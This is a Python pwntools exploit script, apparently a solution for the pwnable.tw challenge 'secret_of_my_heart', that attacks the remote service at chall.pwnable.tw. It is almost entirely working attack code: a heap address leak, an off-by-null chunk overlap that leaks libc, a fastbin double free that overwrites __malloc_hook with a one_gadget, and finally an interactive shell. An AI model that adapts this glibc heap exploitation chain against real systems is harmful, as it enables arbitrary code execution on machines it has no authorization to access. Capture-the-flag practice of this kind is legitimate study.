#!/usr/bin/env python3
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./secret_of_my_heart_patched')
libc = ELF('./libc_64.so.6')
ld = ELF('./ld-2.23.so')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
else:
    p = remote('chall.pwnable.tw', 10302)

def add(sz, name, data):
    sla('Your choice :', '1')
    sla('Size of heart : ', str(sz))
    sa('Name of heart :', name)
    sa('secret of my heart :', data)

def show(idx):
    sla('Your choice :', '2')
    sla('Index :', str(idx))

def delete(idx):
    sla('Your choice :', '3')
    sla('Index :', str(idx))

def show_secret():
    sla('Your choice :', '4869')

# leak heap
add(0x18, 'A' * 0x20, 'A') # 0
show(0)
ru('Name : ' + 'A' * 0x20)
heap_base = uu64(r(6).ljust(8, '\x00')) - 0x10
info('heap_base = ' + hex(heap_base))

# chunk overlapping
add(0x100, 'A', 'A') # 1
add(0x100, 'A', 'A') # 2
add(0x18, 'A', 'A') # 3
delete(0)
delete(1)
add(0x18, 'A', 'A' * 0x18) # 0 <-- off by null
add(0x88, 'A', 'A') # 1
add(0x40, 'V', 'V') # 4 <-- victim chunk
delete(1)
delete(2) # consolidate

# leak libc
add(0x80, 'B', '/bin/sh\x00') # 1
show(4)
ru('Secret : ')
libc_base = uu64(r(6).ljust(8, '\x00')) - 0x3c3b78
info('libc_base = ' + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
info('malloc_hook = ' + hex(malloc_hook))
realloc = libc_base + libc.sym['__libc_realloc']
info('realloc = ' + hex(realloc))
system = libc_base + libc.sym['system']
info('system = ' + hex(system))
one_gadgets = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
one_gadget = libc_base + one_gadgets[1]
info('one_gadget = ' + hex(one_gadget))

# overwrite __malloc_hook
add(0x68, 'C', 'C') # 2
add(0x68, 'C', 'C') # 5
delete(2)
delete(5)
delete(4) # double free
add(0x68, 'C', up64(malloc_hook - 0x23)) # 2
add(0x68, 'C', 'C') # 4
add(0x68, 'C', 'C') # 5
add(0x68, 'C', 'C' * 0xb + up64(one_gadget) + up64(realloc + 0x10)) # 6

#gdb.attach(p)

# get shell
sla('Your choice :', '1')
sla('Size of heart : ', '10')
sa('Name of heart :', 'A')

p.interactive()

